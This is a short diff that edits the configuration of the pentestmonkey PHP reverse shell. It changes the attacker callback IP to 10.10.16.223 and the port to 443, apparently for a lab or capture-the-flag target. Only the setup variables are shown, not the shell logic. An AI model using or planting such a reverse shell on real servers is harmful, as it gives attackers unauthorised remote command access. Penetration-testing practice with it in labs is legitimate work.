@@ -43,10 +43,12 @@
 // Usage
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.30.131'; // CHANGE THIS
-$port = 7777;       // CHANGE THIS
+$ip = '10.10.16.223'; // CHANGE THIS
+$port = 443;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
